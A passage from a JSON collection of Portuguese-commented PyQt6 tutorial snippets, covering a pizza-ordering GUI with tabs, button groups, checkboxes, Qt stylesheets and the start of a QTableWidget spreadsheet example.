1\n\t\tself.pizza_tab.setObjectName('Tabs') #Estilo da janela 1\n\t\t\n\t\tself.wings_tab = QWidget() #Janela 2\n\t\tself.wings_tab.setObjectName('Tabs') #Estilo da janela 2\n\t\t\n\t\t#Acrescentando os nomes dos bot\u00f5es referentes as janelas\n\t\tself.tab_bar.addTab(self.pizza_tab, 'Pizza')\n\t\tself.tab_bar.addTab(self.wings_tab, 'Wings')\n\t\t\n\t\t#Chamando os m\u00e9todos que tem os conte\u00fados de cada janela Tab\n\t\tself.pizzaTab()\n\t\tself.wingsTab()\n\t\t\n\t\t'''Lado Direito'''\n\t\t#\u00c9 o fundo, apenas est\u00e9tico, sem fun\u00e7\u00e3o real\n\t\t#Fundo do lado direito parte superior ate a parate inferior\n\t\tself.side_widget = QWidget()\n\t\tself.side_widget.setObjectName('Tabs')\n\t\t\n\n\t\torder_label = QLabel('Seu Pedido')\n\t\torder_label.setObjectName('Header')\n\t\t\n\t\t#Fundo no lado esquerdo, apenas no modo de prepato e ingredients\n\t\t#\u00c9 ajusatdo de acordo com a quantidade de ingredientes\t\t\n\t\titems_box = QWidget()\n\t\titems_box.setObjectName('Side')\n\t\t\n\t\tpizza_label = QLabel('Tipo de Pizza: ')\n\t\t\n\t\t#Mostra a forma de preparo escolhido, come\u00e7a zerado\n\t\tself.display_pizza_label = QLabel('')\n\t\ttoppings_label = QLabel('Ingredientes: ')\n\t\t\n\t\t#Mostra os ingredientes escolhidos, come\u00e7a zerado\n\t\tself.display_toppings_label = QLabel('')\n\t\t\n\t\textra_label = QLabel('Extra:')\n\t\t\n\t\t#Mostra os ingredientes extra escolhidos, comeca zerado\n\t\tself.display_wings_label = QLabel('')\n\t\t\n\t\t#Organizando toda a parte direita\n\t\t#-tipo de pizza\n\t\t#-ingreditens \n\t\t#-Extra \n\t\t#-Widgets\n\t\t\n\t\titems_grid = QGridLayout()\n\t\titems_grid.addWidget(pizza_label, 0, 0,\n\t\t\tQt.AlignmentFlag.AlignRight)\n\t\titems_grid.addWidget(self.display_pizza_label, 0, 1)\n\t\titems_grid.addWidget(toppings_label, 1, 0, \n\t\t\tQt.AlignmentFlag.AlignRight)\n\t\titems_grid.addWidget(self.display_toppings_label, 1, 1)\n\t\titems_grid.addWidget(extra_label, 2, 0,\n\t\t\tQt.AlignmentFlag.AlignRight)\n\t\titems_grid.addWidget(extra_label, 2, 0)\n\t\titems_grid.addWidget(self.display_wings_label, 2, 1)\n\t\titems_box.setLayout(items_grid)\n\t\t'''Ao colocar o items_box.setLayout() ao inv\u00e9s \n\t\tde self.setLayout() isso faz com que o layout \n\t\tseja feito dentro do QWidget(). Dessa forma ele\n\t\taumenta e diminui o tamanho automaticamente '''\n\t\t\n\t\tside_v_box = QVBoxLayout()\n\t\tside_v_box.addWidget(order_label)\n\t\t#Nesse cado o layout \u00e9 o items_box\n\t\tside_v_box.addWidget(items_box)\n\t\t#Esse espa\u00e7o serve para deixar tudo na parte de cima\n\t\tside_v_box.addStretch()\n\t\tself.side_widget.setLayout(side_v_box)\n\t\t'''Ao colocar self.side_widget.setLayout(), colocar o layout\n\t\ttodo la de cima dentro do widget side'''\n\t\t\n\n\t\t\n\t\t#Adicionando tudo na janela principal da pagina\n\t\tmain_h_box = QHBoxLayout()\n\t\tmain_h_box.addWidget(self.tab_bar, 1)#Eslaticiadade = Numero\n\t\tmain_h_box.addWidget(self.side_widget)\n\t\tself.setLayout(main_h_box)\n\t\t\n\tdef pizzaTab(self):\n\t\ttab_pizza_label = QLabel('MONTE SUA PR\u00d3PRIA PIZZA')\n\t\ttab_pizza_label.setObjectName('Header')\n\t\t\n\t\t#Onde a descri\u00e7\u00e3o vai ser colocada e a imagem\n\t\tdescription_box = QWidget()\n\t\tdescription_box.setObjectName('ImageBorder')\n\t\t\n\t\tpizza_image_path = 'pizza.png'\n\t\ttry:\n\t\t\twith open(pizza_image_path):\n\t\t\t\tobjeto = QLabel(self)\n\t\t\t\timagem = QPixmap(pizza_image_path)\n\t\t\t\timagem_redimensionada = imagem.scaled(100, 100)\n\t\t\t\tobjeto.setPixmap(imagem_redimensionada)\n\t\texcept:\n\t\t\tpass\n\t\t\t\n\t\tpizza_desc = QLabel()\n\t\tpizza_desc.setObjectName('ImageInfo')\n\t\tpizza_desc.setText(\n\t\t\t'''<p>Fa\u00e7a uma pizza customizada para voc\u00ea. Comece com \n\t\t\tsua crosta favorita e adicione os ingredientes mais a \n\t\t\tquantidade perfeita de queijo e molho.</p>''')\n\t\t\n\t\t#Garante que o texto seja quebrado em varias linhas caso necess\t\n\t\tpizza_desc.setWordWrap(True)\n\t\t#Marge esquerda, superior, direita, inferior do label\n\t\tpizza_desc.setContentsMargins(10, 10, 10, 10)\n\t\t\n\t\t#Montar o layout da imagem e da descri\u00e7\u00e3o da pizza\n\t\tpizza_h_box = QHBoxLayout()\n\t\tpizza_h_box.addWidget(objeto)\n\t\tpizza_h_box.addWidget(pizza_desc, 1)\n\t\tdescription_box.setLayout(pizza_h_box)\n\t\t\n\t\t#Cria a caixinha bonita\n\t\tcrust_gbox = QGroupBox()\n\t\tcrust_gbox.setTitle('ESCOLHA A FORMA')#T\u00edtulo da caixa bonita\n\t\t\n\t\tself.crust_group = QButtonGroup()#Grupo de botoes\n\t\tgb_v_box = QVBoxLayout() #O Layout\n\t\t\n\t\tcrust_list = ['Jogado \u00e0 m\u00e3o', 'Plano', 'Recheado']\n\t\t\n\t\t#Fazendo o laco que vai \n\t\t#-Criar os botoes\n\t\t#-Adicionar os botoes no layout\n\t\t#-Adicionar os botoes no grupo de botoes\n\t\t\n\t\tfor cr in crust_list:\n\t\t\tcrust_rb = QRadioButton(cr) #Criamos os botoes com a lista\n\t\t\tgb_v_box.addWidget(crust_rb)#Colocamos no Layout\n\t\t\tself.crust_group.addButton(crust_rb)#Colocamos no grupo \n\t\t\n\t\t#Coloca o layout organizado dentro da caixa\n\t\tcrust_gbox.setLayout(gb_v_box)\n\t\t\t\n\t\t#Criando o grupo box que v\u00e3o os ingredientes\n\t\ttoppings_gbox = QGroupBox()\n\t\ttoppings_gbox.setTitle('ESCOLHA OS INGREDIENTES')\n\t\t\n\t\t#Criando o grupo de botoes da sele\u00e7\u00e3o dos ingredientes\n\t\tself.toppings_group = QButtonGroup()\n\t\tgb_v_box = QVBoxLayout()\n\t\t\n\t\ttoppings_list = ['Pepperoni', 'Salsa', 'Bacon',\n\t\t\t\t\t\t'Canadian Bacon', 'Befe', 'Picles', \n\t\t\t\t\t\t'Oliva', 'Tomate', 'Piment\u00e3o Verde',\n\t\t\t\t\t\t'Cogumelo', 'Cebola', 'Espinafle', \n\t\t\t\t\t\t'Queijo']\n\t\t\t\t\t\t\n\t\tfor top in toppings_list:\n\t\t\ttoppings_rb = QRadioButton(top)\n\t\t\tgb_v_box.addWidget(toppings_rb)\n\t\t\tself.toppings_group.addButton(toppings_rb)\n\t\t\n\t\t#Permite marcar v\u00e1rios botoes \n\t\tself.toppings_group.setExclusive(False)\n\t\ttoppings_gbox.setLayout(gb_v_box)\n\t\t\n\t\tadd_to_order_button1 = QPushButton('Adicionar ao pedido')\n\t\tadd_to_order_button1.clicked.connect(self.displayPizzaInOrder)\n\t\t\n\t\t#Criando o Layout geral Tab(P\u00e1gina 1)\n\t\tpage1_v_box = QVBoxLayout()\n\t\tpage1_v_box.addWidget(tab_pizza_label)\n\t\tpage1_v_box.addWidget(description_box)\n\t\tpage1_v_box.addWidget(crust_gbox)\n\t\tpage1_v_box.addWidget(toppings_gbox)\n\t\tpage1_v_box.addStretch()\n\t\tpage1_v_box.addWidget(add_to_order_button1, alignment=Qt.AlignmentFlag.AlignRight)\n\t\t#Setar a janela 1, self.pizza_tab\n\t\tself.pizza_tab.setLayout(page1_v_box)\n\t\t\n\tdef wingsTab(self):\n\t\ttab_wings_label = QLabel('TENTE COM SUAS ASAS')\n\t\ttab_wings_label.setObjectName('Header')\n\t\t\n\t\tdescription_box = QWidget()\n\t\tdescription_box.setObjectName('ImageBorder')\n\t\tpizza_image_path = 'pizza.png'\n\t\t\n\t\ttry:\n\t\t\twith open(pizza_image_path):\n\t\t\t\tobjeto = QLabel(self)\n\t\t\t\timagem = QPixmap(pizza_image_path)\n\t\t\t\timagem_redimensionada = imagem.scaled(100, 100)\n\t\t\t\tobjeto.setPixmap(imagem_redimensionada)\t\n\t\texcept:\n\t\t\tpass\n\t\t\t\n\t\twings_desc = QLabel()\n\t\twings_desc.setObjectName('ImageInfo')\n\t\twings_desc.setText(\n\t\t'''<p>6 peda\u00e7os de um rico sabor, carne branca que far\u00e1\n\t\tvoc\u00ea voltar para mais</p>''')\n\t\twings_desc.setWordWrap(True)\n\t\twings_desc.setContentsMargins(10, 10, 10, 10)\n\t\t\n\t\twings_h_box = QHBoxLayout()\n\t\twings_h_box.addWidget(objeto)\n\t\twings_h_box.addWidget(wings_desc, 1)\n\t\tdescription_box.setLayout(wings_h_box)\n\t\t\n\t\twings_gbox = QGroupBox()\n\t\twings_gbox.setTitle('ESCOLHA O SEU SABOR')\n\t\t\n\t\tself.wings_group = QButtonGroup()\n\t\tgb_v_box = QVBoxLayout()\n\t\tflavors_list = [\n\t\t\t\t\t'Buffalo', 'Doce Azedo', 'Teriyaki', 'Barbecue']\n\t\t\t\t\t\n\t\tfor fl in flavors_list:\n\t\t\tflavor_rb = QRadioButton(fl)\n\t\t\tgb_v_box.addWidget(flavor_rb)\n\t\t\tself.wings_group.addButton(flavor_rb)\n\t\t\t\n\t\twings_gbox.setLayout(gb_v_box)\n\t\t\n\t\tadd_to_order_button2 = QPushButton('Adicionar pedido')\n\t\t#add_to_order_button2.clicked.connect(self.displayWingsInOrder)\n\t\t\n\t\tpage2_v_box = QVBoxLayout()\n\t\tpage2_v_box.addWidget(tab_wings_label)\n\t\tpage2_v_box.addWidget(description_box)\n\t\tpage2_v_box.addWidget(wings_gbox)\n\t\tpage2_v_box.addWidget(add_to_order_button2, \n\t\t\talignment=Qt.AlignmentFlag.AlignRight)\n\t\tpage2_v_box.addStretch()\n\t\tself.wings_tab.setLayout(page2_v_box)\n\t\t\n\tdef displayPizzaInOrder(self):\n\t\t#Grupo de bot\u00f5es, se um deles estiver marcado\n\t\tif self.crust_group.checkedButton():\n\t\t\t#Texto = texto do botao marcado\n\t\t\ttext = self.crust_group.checkedButton().text()\n\t\t\tself.display_pizza_label.setText(text)\n\t\t\t\n\t\t\t#Fun\u00e7\u00e3o que retorna uma lista com os textos dos botoes \n\t\t\ttoppings = self.collectToppingsInList()\n\t\t\ttoppings_str = '\\n'.join(toppings)#Adiciona organizado linha\n\t\t\tself.display_toppings_label.setText(toppings_str)\n\t\t\tself.update()\n\t\t\t\n\tdef collectToppingsInList(self):\n\t\t'''O la\u00e7o percore a lista que contem o grupo de bot\u00f5es e cada\n\t\tbotao \u00e9 o button, button.text() pega os textos desse botoes, se \n\t\tmarcado, button.text() entrar\u00e1 na lista que ser\u00e1 devolvido pela\n\t\tfun\u00e7\u00e3o\n\t\t\n\t\t'''\n\t\ttoppings_list =[button.text() for button in list(self.toppings_group.buttons()) if button.isChecked()]\n\t\tprint(toppings_list)\n\t\treturn toppings_list\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tstyle_sheet = '''\n\t\tQWidget{\n\t\t\tbackground-color: #C92108;\n\t\t}\n\t\t\n\t\tQWidget#Tabs{\n\t\t\tbackground-color: #FCEBCD;\n\t\t\tborder-radius: 4px\n\t\t}\n\t\t\n\t\tQWidget#ImageBorder{\n\t\t\tbackground-color: #FCF9F3;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #FABB4C\n\t\t}\n\t\t\n\t\tQWidget#Side{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-radius: 4px\n\t\t}\n\t\t\n\t\tQLabel{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #EFD096\n\t\t}\n\t\t\n\t\tQLabel#Header{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #EFD096;\n\t\t\tpadding-left: 10px;\n\t\t\tcolor: #961A07\n\t\t}\n\t\t\n\t\tQLabel#ImageInfo{\n\t\t\tbackground-color: #FCF9F3;\n\t\t\tborder-radius: 4px\n\t\t}\n\t\t\n\t\tQGroupBox{\n\t\t\tbackground-color: #FCEBCD;\n\t\t\tcolor: #961A07\n\t\t}\n\t\t\n\t\tQRadioButton{\n\t\t\tbackground-color: #FCF9F3;\n\t\t}\n\t\t\n\t\tQPushButton{\n\t\t\tbackground-color: #C92108;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #FFFFFF\n\t\t}\n\t\t\n\t\tQPushButton:pressed{\n\t\t\tbackground-color: #C86354;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #DFD8D7\n\t\t}\n\t\t'''\n\t\t\n\t\t\n\t\t\n\n\t\t\n\t\n\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "QButtonGroup(self) - QGroupBox() - botoes automaticos": {"categoria": "PyQt6", "codigo": "from PyQt6.QtWidgets import (QApplication,QWidget, QRadioButton, QGroupBox, \nQButtonGroup, QVBoxLayout, QPushButton, QRadioButton)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QFont\nimport sys\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('Exemplo')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t#Crie a caixa bonita com o t\u00edtulo\n\t\t#Crie o grupo de botoes\n\t\t#Crie o layout\n\t\t#Crie a lista do nome dos botoes\n\t\t#Fa\u00e7a os botoes automatico, layout, grupo, layout dentro da caixa\n\t\t#Fa\u00e7a o layout final\n\t\t\n\t\tbotao_gbox = QGroupBox()\n\t\tbotao_gbox.setTitle('Aperte o bot\u00e3o que desejar')\n\t\t\n\t\tself.botoes_grupo = QButtonGroup()\n\t\tself.botoes_grupo.buttonClicked.connect(self.botao_clicado)\n\t\t\n\t\tgb_v_box = QVBoxLayout()\n\t\t\n\t\tbotoes_lista = ['botao 1', 'botao 2', 'botao 3', 'botao 4 ', \n\t\t\t\t\t\t'botao 5', 'botao 6', 'botao 7', 'botao 8']\n\t\t\n\t\tfor bt in botoes_lista:\n\t\t\tbotao = QPushButton(bt)\n\t\t\tgb_v_box.addWidget(botao)\n\t\t\tself.botoes_grupo.addButton(botao)\n\t\t\n\t\tgb_v_box.addStretch()\n\t\t\t\n\t\tbotao_gbox.setLayout(gb_v_box)\t\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(botao_gbox)\t\n\t\tself.setLayout(main_v_box)\t\n\t\n\tdef botao_clicado(self, button):\n\t\tprint(f'Bot\u00e3o clicado: {button.text()}')\t\n\n\t\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tstyle_sheet = '''\n\n\tQPushButton{\n\t\tbackground-color: #00CBE4;\n\t\tborder-radius: 8px;\n\t\tpadding: 6px;\n\t\tcolor: #000000\n\t\n\t}\n\t\n\tQPushButton:hover{\n\t\tbackground-color: #C7E3E6 ;\n\t\tcolor: #000000\n\n\n\t}\n\t\n\tQPushButton:pressed{\n\t\tbackground-color: #5CEDFF;\n\t\tborder-radius: 8px;\n\t\tpadding: 6px;\n\t\tcolor: #000000\n\t}\t\t\n\t\n\tQGroupBox{\n\t\tbackground-color: #D3E3E9;\n\t\tcolor: #D11D33\n\t\t\n\t\t\n\t}\n\t\t\n\t\t\n\t\t\n\t\t\n\t'''\n\t\n\t\n\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n"}, "QButtonGroup(self) + QCheckBox() / QRadioButton()": {"codigo": "from PyQt6.QtWidgets import (QApplication,QWidget, QRadioButton, QGroupBox, \nQButtonGroup, QVBoxLayout, QPushButton, QRadioButton, QCheckBox)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QFont\nimport sys\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('Exemplo')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tbotao_gb = QGroupBox()\n\t\tbotao_gb.setTitle('SELECIONE O BOTAO QUE QUISER')\n\t\t\n\t\tself.botoes_grupo = QButtonGroup()\n\t\tself.botoes_grupo.buttonClicked.connect(self.botao_clicado)\n\t\t\n\t\tgb_v_box = QVBoxLayout()\n\t\t\n\t\tlista_botoes = ['Op\u00e7\u00e3o 1', 'Op\u00e7\u00e3o 2', 'Op\u00e7\u00e3o 3', 'Op\u00e7\u00e3o 4']\n\t\t\n\t\tfor cb in lista_botoes:\n\t\t\tcheck_box = QCheckBox(cb) #ou QRadioButton()\n\t\t\tgb_v_box.addWidget(check_box)\n\t\t\tself.botoes_grupo.addButton(check_box)\n\t\t\t\n\t\tgb_v_box.addStretch()\n\t\tbotao_gb.setLayout(gb_v_box)\n\t\tself.botoes_grupo.setExclusive(False)\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(botao_gb)\n\t\tself.setLayout(main_v_box)\n\t\t\t\n\tdef botao_clicado(self, button):\n\t\tbotao = button.text()\n\t\tif button.isChecked():\n\t\t\tprint(f' Item Checado: {botao}')\n\t\telse:\n\t\t\tprint(f' Bot\u00e3o Deschecado: {botao}')\n\t\t\n\t\t\nif __name__ == '__main__':\n\tstyle_sheet = '''\n\n\tQPushButton{\n\t\tbackground-color: #00CBE4;\n\t\tborder-radius: 8px;\n\t\tpadding: 6px;\n\t\tcolor: #000000\n\t\n\t}\n\t\n\tQPushButton:hover{\n\t\tbackground-color: #C7E3E6 ;\n\t\tcolor: #000000\n\n\n\t}\n\t\n\tQPushButton:pressed{\n\t\tbackground-color: #5CEDFF;\n\t\tborder-radius: 8px;\n\t\tpadding: 6px;\n\t\tcolor: #000000\n\t}\t\t\n\t\n\tQGroupBox{\n\t\tbackground-color: #D3E3E9;\n\t\tcolor: #D11D33\n\t\t\n\t\t\n\t}\n\t\t\n\t\t\n\t\t\n\t\t\n\t'''\n\t\n\t\n\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n", "categoria": "PyQt6"}, "folha de estilo - estilo dos widgets no GUI": {"categoria": "PyQt6", "codigo": "cor_1_btn.setObjectName('btn_1')\t\n\n\n\tstyle_sheet = '''\n\t\tQWidget{\n\t\t\tbackground-color: #C92108;\n\t\t}\n\t\t\n\t\tQWidget#Tabs{\n\t\t\tbackground-color: #FCEBCD;\n\t\t\tborder-radius: 4px\n\t\t}\n\t\t\n\t\tQWidget#ImageBorder{\n\t\t\tbackground-color: #FCF9F3;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #FABB4C\n\t\t}\n\t\t\n\t\tQWidget#Side{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-radius: 4px\n\t\t}\n\t\t\n\t\tQLabel{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #EFD096\n\t\t}\n\t\t\n\t\tQLabel#Header{\n\t\t\tbackground-color: #EFD096;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 4px;\n\t\t\tborder-color: #EFD096;\n\t\t\tpadding-left: 10px;\n\t\t\tcolor: #961A07\n\t\t}\n\t\t\n\t\tQLabel#ImageInfo{\n\t\t\tbackground-color: #FCF9F3;\n\t\t\tborder-radius: 4px\n\t\t}\n\t\t\n\t\tQGroupBox{\n\t\t\tbackground-color: #FCEBCD;\n\t\t\tcolor: #961A07\n\t\t}\n\t\t\n\t\tQRadioButton{\n\t\t\tbackground-color: #FCF9F3;\n\t\t}\n\t\t\n\t\tQPushButton{\n\t\t\tbackground-color: #C92108;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #FFFFFF\n\t\t}\n\t\t\n\t\tQPushButton:pressed{\n\t\t\tbackground-color: #C86354;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #DFD8D7\n\t\t}\n\t\t'''\n\n\nif __name__ == '__main__':\n\tstyle_sheet = '''\n\t\tQWidget#FundoPagina{\n\t\t\tbackground-color: #000000;\n\t\t\t}\n\t\tQWidget#FundoPagina2{\n\t\t\tbackground-color: #8E2323;\n\t\t\t}\n\n\t\t\n\t\tQWidget#ImageBorder{\n\t\t\tbackground-color: #685014;\n\t\t\tborder-width: 2px;\n\t\t\tborder-style: solid;\n\t\t\tborder-radius: 10px;\n\t\t\tborder-color: #FFA500;\n\t\t\t}\n\t\tQLabel#ImageInfo{\n\t\t\tbackground-color: #656565;\n\t\t\tborder-radius: 10px;\n\t\t\tcolor: #FFFFFF;\n\t\t\t}\n\t\tQWidget#FundoGeral{\n\t\t\tbackground-color: #6D501A\n\t\t\t}\n\t\tQTabWidget#Entrada{\n\t\t\tbackground-color: #FFFFFF;\n\t\t\tborder-radius: 8px;\n\t\t\t}\n\t\tQScrollArea{\n\t\t\tbackground-color:#685014;\n\t\t\tborder-color: #685014;\n\t\t\tborder-radius: 8px;\n\t\t\t}\n\t\tQScrollBar:vertical {\n\t\t\tborder: 1px solid #685014;  /* Cor da borda da barra de rolagem vertical */\n\t\t\tbackground: #000000;  /* Cor de fundo da barra de rolagem vertical */\n\t\t\twidth: 10px;  /* Largura da barra de rolagem vertical */\n\t\t\tmargin: 0px 0px 0px 0px;\n\t\t\t}\n\n\t\tQScrollBar::handle:vertical {\n\t\t\tbackground: #6D501A;  /* Cor da al\u00e7a da barra de rolagem vertical */\n\t\t\tmin-height: 0px;\n\t\t\t}\n\n\t\tQScrollBar::add-line:vertical {\n\t\t\tborder: 2px solid #685014;  /* Cor da seta de adi\u00e7\u00e3o vertical */\n\t\t\tbackground: #8E2323;  /* Cor de fundo da seta de adi\u00e7\u00e3o vertical */\n\t\t\theight: 0px;\n\t\t\tsubcontrol-position: bottom;\n\t\t\tsubcontrol-origin: margin;\n\t\t\t}\n\n\t\tQScrollBar::sub-line:vertical {\n\t\t\tborder: 2px solid #685014;  /* Cor da seta de subtra\u00e7\u00e3o vertical */\n\t\t\tbackground: #8E2323;  /* Cor de fundo da seta de subtra\u00e7\u00e3o vertical */\n\t\t\theight: 0 px;\n\t\t\tsubcontrol-position: top;\n\t\t\tsubcontrol-origin: margin;\n\t\t\t}\n\t\t\t\n\t\tQTabWidget::pane {\n\t\tbackground-color: #8E2323;  /* Cor de fundo do QTabWidget */\n\t\t\tborder: 1px solid #FFA500; /* Cor da borda do QTabWidget */\n\t\t\tborder-radius: 4px;\n\t\t\t}\n    \n\t\tQTabBar::tab {\n\t\t\tbackground-color: #8E2323;  /* Cor de fundo da aba do QTabWidget */\n\t\t\tborder: 1px solid #FFA500; /* Cor da borda da aba do QTabWidget */\n\t\t\tborder-top-left-radius: 4px;\n\t\t\tborder-top-right-radius: 4px;\n\t\t\tpadding: 8px;\n\t\t\tcolor: #FFFFFF\n\t\t\t}\n    \n\t\tQTabBar::tab:selected {\n\t\t\tbackground-color: #8E2323;  /* Cor de fundo da aba selecionada do QTabWidget */\n\t\t\tborder: 1px solid #FFA500; /* Cor da borda da aba selecionada do QTabWidget */\n\t\t\tborder-bottom-color: #6D501A; /* Cor da borda inferior da aba selecionada */\n\t\t\t}\n    \n\t\tQTabBar::tab:!selected {\n\t\t\tmargin-top: 2px;  /* Margem superior das abas n\u00e3o selecionadas do QTabWidget */\n\t\t\t}\n\t\tQPushButton{\n\t\t\tbackground-color: #C92108;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #FFFFFF\n\t\t}\n\t\t\n\t\tQPushButton:pressed{\n\t\t\tbackground-color: #C86354;\n\t\t\tborder-radius: 4px;\n\t\t\tpadding: 6px;\n\t\t\tcolor: #DFD8D7\n\t\t}\n\t\t\t'''\n\t\t\t\n\t\t\t\n\tapp = QApplication(sys.argv)\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\n\nFOLHA DE ESTILO EXTERNA############################################\n###############################################################\n1) Crie um arquivo com a extens\u00e3o '.qss' (por exemplo, 'style.qss').\n2) Adicione suas regaras de estilo nesse arquivo. Por exemplo:\n\nQPushButton {\n\tbackground-color: #FFFFFF;\n\tcolor: black;\n\tborder-radius: 6px;\n\tborder: none;\n}\nQPushButton:pressed {\n\tbackground-color: #C86354;\n\tborder-radius: 4px;\n\tpadding: 10px;\n\tcolor: #DFD8D7;\n}\nQPushButton:hover {\n\tbackground-color: #2980b9;\n}\n\n3) Para importar, abaixo tem um exemplo de como fazer.\nimport sys\nfrom PyQt6.QtWidgets import QWidget, QApplication, QPushButton\nfrom PyQt6.QtGui import QFont, QKeySequence, QShortcut, QIcon\nfrom PyQt6.QtCore import Qt, QSize\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('Botao')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tbotao = QPushButton(self)\n\t\tbotao.setFont(QFont('Arial', 12))\n\t\tbotao.resize(130, 50)\n\t\tbotao.setEnabled(True)\n\t\tbotao.move(20, 20)\n\t\t\n\t\ticon = QIcon('dinheiro.png')\n\t\tbotao.setIcon(icon)\n\t\tbotao.setIconSize(QSize(40, 40))\n\t\t\n\t\tatalho_botao = QShortcut(QKeySequence(Qt.Key.Key_F10), self)\n\t\tatalho_botao.activated.connect(botao.click)\n\t\tbotao.clicked.connect(self.botao)\n\t\n\tdef botao(self):\n\t\tprint('botao apertado')\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\t\n\t# Carregar a folha de estilo de um arquivo externo\n\twith open('style.qss', 'r') as f:\n\t\tstyle_sheet = f.read()\n\t\n\tapp.setStyleSheet(style_sheet)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n"}, "QTableWidget  - tabela estilo excel": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QMainWindow,\nQTableWidget, QTableWidgetItem, QMenu, QInputDialog)\nfrom PyQt6.QtGui import QAction\n\nclass MainWindow(QMainWindow):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(1000, 500)\n\t\tself.setWindowTitle('SpreadSheet - QTableWidget Example')\n\t\t\n\t\t#Usado para copiar e colar a\u00e7\u00f5es(actions)\n\t\tself.item_text = None\n\t\t\n\t\tself.setUpMainWindow()\n\t\tself.createActions()\n\t\tself.createMenu()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t#Pode passar o n\u00famero de linhas e colunas dentro do widget(10, 10)\n\t\tself.table_widget = QTableWidget()\n\t\n\t#seta os valores iniciais para as linhas e colunas\n\t\tself.table_widget.setRowCount(2000000)\n\t\tself.table_widget.setColumnCount(10)\n\t\t\n\t#Seta a celula foco da celula\n\t\tself.table_widget.setCurrentCell(0,0)\n\t\t\n\t#Quando o cabe\u00e7alho horizontal \u00e9 clicado duas vezes\n\t#Emite um sinal \n\t\th_header = self.table_widget.horizontalHeader()\n\t\th_header.sectionDoubleClicked.connect(\n\t\t\t\tself.changeHeader)\n\t\tself.setCentralWidget(self.table_widget)\n\t\t\n\tdef createActions(self):\n\t\t#Cria aplica\u00e7\u00f5es no menu de a\u00e7\u00f5es \n\t\tself.quit_act = QAction('Quit', self)\n\t\tself.quit_act.setShortcut('Ctrl+Q')\n\t\tself.quit_act.triggered.connect(self.close)\n\t\t\n\t\tself.add_row_above_act = QAction('Add Row Above', self)\n\t\tself.add_row_above_act.triggered.connect(\n\t\t\tself.addRowAbove)\n\t\t\t\n\t\tself.add_row_bellow_act = QAction('Add Row Bellow', self)\n\t\tself.add_row_bellow_act.triggered.connect(\n\t\t\tself.addRowBellow)\n\t\t\t\n\t\tself.add_col_before_act = QAction('Add Column Before', self)\n\t\tself.add_col_before_act.triggered.connect(\n\t\t\tself.addColumnBefore)\n\t\t\t\n\t\tself.add_col_after_act = QAction('Add Column After', self)\n\t\tself.add_col_after_act.triggered.connect(\n\t\t\tself.addColumnAfter)\n\t\t\t\n\t\tself.delete_row_act = QAction('Delete Row', self)\n\t\tself.delete_row_act.triggered.connect(self.deleteRow)\n\t\t\n\t\tself.delete_col_act = QAction('Delete Column', self)\n\t\tself.delete_col_act.triggered.connect(self.deleteColumn)\n\t\t\n\t\tself.clear_table_act = QAction('Clear All', self)\n\t\tself.clear_table_act.triggered.connect(self.clearTable)\n\t\t\n\tdef 